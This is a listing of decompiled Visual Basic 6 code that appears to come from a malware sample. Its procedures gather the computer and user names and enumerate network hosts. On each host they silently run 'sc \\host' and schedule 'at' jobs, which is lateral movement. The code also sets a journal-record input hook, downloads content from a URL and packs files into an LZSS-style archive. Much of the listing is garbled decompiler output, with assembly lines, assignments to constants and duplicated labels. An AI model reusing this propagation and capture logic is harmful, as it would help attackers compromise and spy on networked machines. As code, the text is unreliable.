
Public Sub Proc_3_0_41E880
  On Error Resume Next
  var_24 = Space$(255)
  var_eax = GetComputerNameA(var_24, Len(var_24), FFFFFFFFh)
  var_ret_2 = var_2C
  var_2C = Chr$(0)
  InStr(1, var_24, var_2C, 0) = InStr(1, var_24, var_2C, 0) - 00000001h
  var_28 = Left$(var_24, InStr(1, var_24, var_2C, 0))
  GoTo loc_0041E9AB
  If 0 And 4 Then
  End If
  Exit Sub
  loc_0041E9AB: 
  Exit Sub
  Exit Sub
End Sub

Public Sub Proc_3_1_41E9D0
  On Error Resume Next
  var_28 = Space$(255)
  var_eax = GetUserName(var_28, Len(var_28))
  var_ret_2 = var_2C
  var_2C = Chr$(0)
  InStr(1, var_28, var_2C, 0) = InStr(1, var_28, var_2C, 0) - 00000001h
  var_24 = Left$(var_28, InStr(1, var_28, var_2C, 0))
  GoTo loc_0041EAFB
  If 0 And 4 Then
  End If
  Exit Sub
  loc_0041EAFB: 
  Exit Sub
  Exit Sub
End Sub

Public Sub Proc_3_2_41EB20
  On Error Resume Next
  var_eax = WNetOpenEnum(5, 0, 2, var_60, var_3C)
  var_30 = WNetOpenEnum(5, 0, 2, var_60, var_3C)
  If var_30 = 0 Then
    var_eax = GlobalAlloc(64, var_40)
    var_28 = GlobalAlloc(64, var_40)
    var_eax = WNetEnumResource(var_3C, var_2C, var_28, var_40)
    var_30 = WNetEnumResource(var_3C, var_2C, var_28, var_40)
    If var_30 = 0 Then
      var_38 = var_28
      var_D8 = var_2C
      GoTo loc_0041EC7B
  loc_0041EC69: 
      var_24 = var_24 + var_D4
      var_24 = var_24+var_D4
  loc_0041EC7B: 
      If var_24 <= var_2C Then
        var_eax = CopyMemory(var_60, var_38, 32)
        var_eax = Proc_3_3_41F150(var_4C, 1, edi)
        var_34 = Proc_3_3_41F150(var_4C, 1, edi)
        var_D0 = (var_34 = "\\" & global_0042C168)
        If var_D0 Then
          var_64 = "sc " & var_34
          var_98 = var_64 & global_0042C104
          var_CC = Shell(var_64 & global_0042C104, 0)
          var_64 = "sc " & var_34
          var_98 = var_64 & global_0042C108
          var_CC = Shell(var_64 & global_0042C108, 0)
  loc_0041EE05: 
          var_eax = Proc_2_18_41A980(global_0042C164, 0, ebx)
          If Proc_2_18_41A980(global_0042C164, 0, ebx) > 0 Then
            var_eax = Sleep(00000014h)
            DoEvents
            GoTo loc_0041EE05
          End If
          fs:[00000000h] = Time$
          var_98 = DoEvents
          var_78 = "at " & var_34 & global_004086A8 & FormatDateTime(DateAdd(global_00407C78, 0, global_40000000), 4) & global_0042C100 & global_00409D7C
          var_8C = var_78 & global_0042C168 & global_00406544 & global_0042C13C & global_00406544 & global_0042C0F8
          var_B8 = var_8C & global_004095E4
          var_CC = Shell(var_8C & global_004095E4, 0)
        End If
        var_38 = var_38(9)
        GoTo loc_0041EC69
      End If
    End If
    On Error Resume Next
    If var_28 Then
      var_eax = GlobalFree(var_28)
    End If
    var_eax = WNetCloseEnum(var_3C)
  End If
  Exit Sub
  GoTo loc_0041F12B
  Exit Sub
  loc_0041F12B: 
  Exit Sub
  Exit Sub
End Sub

Public Sub Proc_3_3_41F150
  On Error Resume Next
  var_34 = Chr$(0)
  var_24 = String$(255, Chr$(0))
  var_eax = lstrcpyA(var_24, arg_8, FFFFFFFFh)
  var_ret_2 = var_2C
  var_2C = Chr$(0)
  InStr(1, var_24, var_2C, 0) = InStr(1, var_24, var_2C, 0) - 00000001h
  var_28 = Left$(var_24, InStr(1, var_24, var_2C, 0))
  GoTo loc_0041F298
  If 0 And 4 Then
  End If
  Exit Sub
  loc_0041F298: 
  Exit Sub
End Sub

Public Sub Proc_3_4_41F2C0
  On Error Resume Next
  var_24 = StrConv(arg_8, 64, 0)
  var_6C = var_24
  var_98 = arg_C
  var_54 = StrConv(arg_C, 64, 0)
  var_78 = "Remark for " & arg_8
  var_70 = StrConv("Remark for " & arg_8, 64, 0)
  var_64 = var_70
  var_eax = SetWindowsHookEx(0, var_24, 0, -1)
  var_ret_2 = var_70
  var_eax = SetWindowsHookEx(0, 2, var_E4, global_00406F68)
  GoTo loc_0041F57A
  Exit Sub
  loc_0041F57A: 
End Sub

Public Sub Proc_3_5_41F5C0
  var_38 = arg_8
  call __vbaFixstrConstruct(00000100h, var_34, edi, esi, ebx)
  On Error Resume Next
  var_ret_1 = "Microsoft Internet Explorer"
  var_eax = InternetOpenA(var_ret_1, 00000001h, 00000000h)
  var_30 = InternetOpenA(var_ret_1, 00000001h, 00000000h)
  If var_30 Then
    var_ret_2 = var_38
    var_eax = InternetOpenUrlA(var_30, var_ret_2, 00000000h, 00000000h, global_80000000)
    var_ret_3 = var_3C
    var_28 = InternetOpenUrlA(var_30, var_ret_2, 00000000h, 00000000h, global_80000000)
    If var_28 Then
      var_eax = InternetReadFile(var_28, var_34, 00000100h, var_24)
      call __vbaLsetFixstr(00000000h, var_34, var_3C, 00000000h, 00000000h, 00000000h, FFFFFFFFh)
  loc_0041F739: 
      If var_24 Then
        var_eax = InternetReadFile(var_28, var_34)
        call __vbaLsetFixstr(00000000h, var_34, var_3C, 00000100h, var_24)
        GoTo loc_0041F739
      End If
    End If
    var_eax = InternetCloseHandle(var_28)
  End If
  var_eax = InternetCloseHandle(var_30)
  GoTo loc_0041F7FE
  If 0 And 4 Then
  End If
  Exit Sub
  loc_0041F7FE: 
End Sub

Public Sub Proc_3_6_41F830
  Dim global_00406544 As Me
  var_2C = arg_C
  Dim var_64(17) As Byte
  On Error Resume Next
  call UBound(00000001h, arg_8, 00000001h, var_64, 0040A070h, 00000011h, arg_8, %ecx = %S_edx_S, ebx)
  var_30 = UBound(00000001h, arg_8, 00000001h, var_64, 0040A070h, 00000011h, arg_8, %ecx = %S_edx_S, ebx)
  global_42C23A = FreeFile(10)
  Open var_2C For Unknown As #global_0042C23A Len = -1
  var_eax = Proc_1_1_4115D0(var_78)
  var_7C = Proc_1_1_4115D0(var_78)
  var_eax = Proc_1_0_411210(var_7C)
  Put #global_0042C23A, Proc_1_0_411210(var_7C)
  Put #global_0042C23A, var_30
  Len(global_00405414) = Len(global_00405414) + 00000004h
  Len(global_00405414)+00000004h = Len(global_00405414)+00000004h + 00000001h
  var_E4 = var_30
  loc_0041F9A2: 
  If var_70 <= var_30 Then
    global_42C238 = FreeFile(10)
    If arg_8 Then
      If arg_8 = 1 Then
        var_70 = var_70 - eax+00000014h
        If var_70 >= 0 Then
          var_eax = Err.Raise
        End If
        GoTo loc_0041FA12
      End If
    End If
    var_eax = Err.Raise
  loc_0041FA12: 
    Open ecx+eax For Unknown As #global_0042C238 Len = -1
    If arg_8 Then
      If arg_8 = 1 Then
        var_70 = var_70 - eax+00000014h
        If var_70 >= 0 Then
          var_eax = Err.Raise
        End If
        GoTo loc_0041FA5D
      End If
    End If
    var_eax = Err.Raise
  loc_0041FA5D: 
    var_A4 = InStrRev(edx+eax, -1, 0, )
    If arg_8 Then
      If arg_8 = 1 Then
        var_70 = var_70 - edi+00000014h
        If var_70 >= 0 Then
          var_eax = Err.Raise
        End If
        GoTo loc_0041FAC8
      End If
    End If
    var_eax = Err.Raise
  loc_0041FAC8: 
    global_0042C254 = Mid$(eax+ecx, var_90, )
    global_42C250 = Len(global_0042C254)
    global_42C1C0 = LOF(global_0042C238)
    Put #global_0042C23A, global_0042C250
    Put #global_0042C23A, global_0042C254
    Put #global_0042C23A, global_0042C24C
    Len(global_00405414)+00000004h+00000001h = Len(global_00405414)+00000004h+00000001h + 00000004h
    Len(global_0042C254) = Len(global_0042C254) + Len(global_00405414)+00000004h+00000001h+00000004h
    var_40 = Len(global_0042C254)+Len(global_00405414)+00000004h+00000001h+00000004h
    var_eax = Proc_420F00
    var_34 = global_00000001
  loc_0041FBAD: 
    If esi <= 4077 Then
      If esi >= 4114 Then
        var_eax = Err.Raise
      End If
      00000001h = 00000001h + esi
      GoTo loc_0041FBAD
    End If
    var_eax = Proc_421460
  loc_0041FBFA: 
    If esi <= 17 Then
      If 0042C248h <> var_42C23C Then
        var_eax = Proc_420490
        var_3C = Proc_420490
        var_48 = var_48 + esi
        var_A8 = var_48+esi
        If var_48+esi >= 4114 Then
          var_eax = Err.Raise
        End If
        00000001h = 00000001h + esi
        GoTo loc_0041FBFA
      End If
    End If
    var_38 = 00000001h+esi
    var_44 = 00000001h+esi
    If 00000001h+esi Then
  loc_0041FC78: 
      If 00000001h <= 18 Then
        var_48 = var_48 - 00000001h
        var_eax = Proc_420F80(var_48)
        00000001h = 00000001h + 00000001h
        GoTo loc_0041FC78
      End If
      var_eax = Proc_420F80(var_48)
  loc_0041FCAE: 
      If 0042C1E2h > 00000001h+esi Then
        global_42C1E2 = var_38
      End If
      If var_38 <= 2 Then
        global_42C1E2 = 1
        If var_48 >= 4114 Then
          var_eax = Err.Raise
        End If
        If var_28 >= 18 Then
          var_eax = Err.Raise
        End If
        var_28 = var_28 + 0001h
        var_28 = global_00406544.QueryInterface 'Ignore this
        GoTo loc_0041FDC3
      End If
      0042C1E0h = 0042C1E0h + 0002h
      global_42C1E0 = 0
      If var_28 >= 18 Then
        var_eax = Err.Raise
      End If
      var_28 = var_28 + 0001h
      If edi >= 18 Then
        var_eax = Err.Raise
      End If
      0042C1E2h = 0042C1E2h - 0003h
      cwd
      0042C1E0h = 0042C1E0h + var_58 And 15
      var_28+0001h = var_28+0001h + 0001h
      var_28 = var_28+0001h+0001h
  loc_0041FDC3: 
      movzx cx, var_34
      ecx = ecx * 0002h
      var_34 = ecx*0002h And 255
      If ecx*0002h And 255 = 0 Then
        var_28 = var_28 - 0001h
        If esi <= var_28-0001h Then
          If esi >= 18 Then
            var_eax = Err.Raise
          End If
          var_eax = Proc_420580(ecx+eax)
          00000001h = 00000001h + esi
          GoTo loc_0041FDF5
        End If
        var_28 = var_28 + var_24
        var_24 = var_28+var_24
        var_34 = global_00000001
        var_28 = global_00000001
      End If
      var_74 = global_0042C1E2
      0042C1E2h = 0042C1E2h - 0001h
      var_D4 = global_0042C1E2
      If edi <= var_42C1E2 Then
        If 0042C248h <> var_42C23C Then
          var_eax = Proc_420490
          var_3C = Proc_420490
          var_eax = Proc_420C20(ebx)
          If ebx >= 4114 Then
            var_eax = Err.Raise
          End If
          If ebx < 17 Then
            ebx = ebx + 1000h
            var_A8 = ebx+1000h
            If ebx+1000h >= 4114 Then
              var_eax = Err.Raise
            End If
          End If
          ebx = ebx + 0001h
          var_48 = var_48 + 0001h
          var_eax = Proc_420F80(var_48+0001h And 4095)
          00000001h = 00000001h + edi
          GoTo loc_0041FE79
        End If
      End If
      var_48 = var_48+0001h And 4095
      00000001h+edi = 00000001h+edi + var_44
      var_44 = 00000001h+edi+var_44
      If 00000001h+edi < global_0042C1E2 Then
        00000001h+edi = 00000001h+edi + 0001h
        var_eax = Proc_420C20(ebx+0001h And 4095)
        ebx+0001h And 4095 = ebx+0001h And 4095 + 0001h
        var_48 = var_48 + 0001h
        var_48 = var_48+0001h And 4095
        var_38 = var_38 - 0001h
        If var_38 = 0 Then GoTo loc_0041FF51
        var_eax = Proc_420F80(var_48+0001h And 4095)
        GoTo loc_0041FF51
      End If
      var_38 = var_38
      If var_38 > 0 Then GoTo loc_0041FCAE
      If var_28 > 1 Then
        var_28 = var_28 - 0001h
        If esi <= var_28-0001h Then
          If esi >= 18 Then
            var_eax = Err.Raise
          End If
          var_eax = Proc_420580(eax+ebx)
          var_D8 = var_D8 + esi
          GoTo loc_0041FFD2
        End If
        var_28 = var_28 + var_24
        var_24 = var_28+var_24
      End If
      var_eax = Proc_4_0_4212F0
    End If
    Close #global_0042C238
    Seek #global_0042C23A, var_40
    Put #global_0042C23A, global_0042C24C
    Seek #global_0042C23A, var_40(1093782)
    00000001h = 00000001h + var_70
    var_70 = 00000001h+var_70
    GoTo loc_0041F9A2
  End If
  Close #global_0042C23A
  Exit Sub
  GoTo loc_00420120
  Close #global_0042C238
  Close #global_0042C23A
  var_98 = var_2C
  var_eax = Kill &H4008
  Exit Sub
  GoTo loc_00420120
  Exit Sub
  loc_00420120: 
  var_A4 = var_64
  Exit Sub
End Sub

Public Sub Proc_3_7_420270
  Dim var_1C As Me
  Dim var_18 As Me
  Dim var_14 As Me
  0042C24Ch = 0042C24Ch + 00000001h
  global_42C24C = edi.QueryInterface 'Ignore this
  If 0042C244h = 4095 Then
    If 0042C1BCh Then
      If 0042C1BCh = 1 Then
        00000FFFh = 00000FFFh - edi.%x1 = GetIDsOfNames(%StkVar2) 'Ignore this
        If 00000FFFh >= 0 Then
          var_eax = Err.Raise
        End If
        GoTo loc_0042030A
      End If
    End If
    var_eax = Err.Raise
  loc_0042030A: 
    ReDim var_14(0 To global_0042C244)
    If var_1C Then
      If var_1C = 1 Then
        If esi < 0 Then GoTo loc_00420366
        var_eax = Err.Raise
        GoTo loc_00420366
      End If
    End If
    var_eax = Err.Raise
  loc_00420366: 
    If var_18 Then
      If var_18 = 1 Then
        If edi >= 0 Then
          var_eax = Err.Raise
        End If
        GoTo loc_00420397
      End If
    End If
    var_eax = Err.Raise
  loc_00420397: 
    0042C244h = 0042C244h + 00000001h
    edi.GetTypeInfoCount 'Ignore this = edi.GetTypeInfoCount 'Ignore this + Err.Raise
    edi.GetTypeInfoCount 'Ignore this = edi.GetTypeInfoCount 'Ignore this + Err.Raise
    var_eax = CopyMemory(edi.GetTypeInfoCount, edi.GetTypeInfoCount, )
    Put #global_0042C23A, var_14
    global_42C244 = 0
    GoTo loc_0042045F
  End If
  If 0042C23Ah Then
    If 0042C23Ah = 1 Then
      Put #global_0042C23A, var_14 = Put #global_0042C23A, var_14 - ecx+00000014h
      If Put #global_0042C23A, var_14 >= 0 Then
        var_eax = Err.Raise
      End If
      GoTo loc_0042042D
    End If
  End If
  var_eax = Err.Raise
  loc_0042042D: 
  0042C244h = 0042C244h + 00000001h
  global_42C244 = edi.QueryInterface 'Ignore this
  GoTo loc_0042045F
  Exit Sub
  loc_0042045F: 
  Exit Sub
End Sub

Public Sub Proc_3_8_420670
  var_50 = arg_8
  var_28 = arg_C
  On Error Resume Next
  global_42C238 = FreeFile(10)
  Open var_50 For Unknown As #global_0042C238 Len = -1
  var_3C = Space$(Len(global_00405414))
  Get #global_0042C238, var_3C
  call Proc_1_1_4115D0(var_3C, 1, ecx = %S_edx_S)
  call Proc_1_1_4115D0(var_64, var_64, ecx = %S_edx_S)
  var_6C = var_64
  If (Get #x1#%x3, Get #x1#%x3, %x2 = var_6C) Then
    Close #global_0042C238
    GoTo loc_00420BAD
  End If
  Get #global_0042C238, var_40
  Len(global_00405414) = Len(global_00405414) + 00000004h
  Len(global_00405414)+00000004h = Len(global_00405414)+00000004h + 00000001h
  var_48 = Len(global_00405414)+00000004h+00000001h
  var_A8 = var_40
  loc_004207F8: 
  If var_5C <= var_40 Then
    Get #global_0042C238, global_0042C250
    Get #global_0042C238, Space$(global_0042C250)
    Get #global_0042C238, global_0042C1C0
    If arg_10 Then
      global_0042C254 = 00408114h
    End If
    global_42C23A = FreeFile(10)
    Open var_28 & global_0042C254 For Unknown As #global_0042C23A Len = -1
  loc_004208CC: 
    If esi <= 4077 Then
      If esi >= 4114 Then
        var_eax = Err.Raise
      End If
      00000001h = 00000001h + esi
      GoTo loc_004208CC
    End If
    var_58 = global_00000008
    var_eax = Proc_421460(, , )
    global_42C1B4 = 7FFFFFFFh
  loc_0042093D: 
    If var_60 <= var_7FFFFFFF Then
      If var_58 = 8 Then
        If 0042C248h = var_42C23C Then GoTo loc_00420AFE
        var_eax = Proc_420160(, , )
        var_44 = Proc_420160(, , )
      End If
      If Proc_420160(, , ) And 1 = 0 Then
        If 0042C248h = var_42C23C Then GoTo loc_00420AFE
        var_eax = Proc_420160(, )
        var_eax = Proc_3_7_420270(Proc_420160(, ))
        If 00000FEEh >= 4114 Then
          var_eax = Err.Raise
        End If
        00000FEEh = 00000FEEh + 0001h
  loc_004209D5: 
        movzx cx, cl
        var_44 = var_44
        movzx cx, var_58
        ecx = ecx + 0001h
        var_58 = .QueryInterface 'Ignore this
        00000001h = 00000001h + var_60
        var_60 = 00000001h+var_60
        GoTo loc_0042093D
      End If
      If 0042C248h <> var_42C23C Then
        var_eax = Proc_420160
        If 0042C248h <> var_42C23C Then
          movzx si, al
          var_eax = Proc_420160
          movzx ax, al
          Proc_420160 And 240 = Proc_420160 And 240 * 0010h
          Proc_420160 And 240 = Proc_420160 And 240 - 0002h
          var_20 = Proc_420160 And 240
          Proc_420160 And 15 = Proc_420160 And 15 + 0002h
          var_2C = Proc_420160 And 15+0002h
          If esi > Proc_420160 And 15+0002h Then GoTo loc_004209D5
          esi = esi + var_20
          If esi+var_20 And 4095 >= 0 Then
            var_eax = Err.Raise
          End If
          var_34 = edi+edx
          var_eax = Proc_3_7_420270(Proc_420160(, ))
          If 00000FEEh+0001h And 4095 >= 0 Then
            var_eax = Err.Raise
          End If
          00000FEEh+0001h And 4095 = 00000FEEh+0001h And 4095 + 0001h
          00000001h = 00000001h + esi
          GoTo loc_00420A76
  loc_00420AFE: 
  loc_00420AFE: 
  loc_00420AFE: 
  loc_00420AFE: 
    Close #global_0042C23A
    Seek #global_0042C238, var_48(2187530)(2187530)
    00000001h = 00000001h + var_5C
    var_5C = 00000001h+var_5C
    GoTo loc_004207F8
  End If
  Close #global_0042C238
  Exit Sub
  GoTo loc_00420BE2
  Close #global_0042C238
  Close #global_0042C23A
  loc_00420BAD: 
  Exit Sub
  GoTo loc_00420BE2
  Exit Sub
  loc_00420BE2: 
  Exit Sub
End Sub
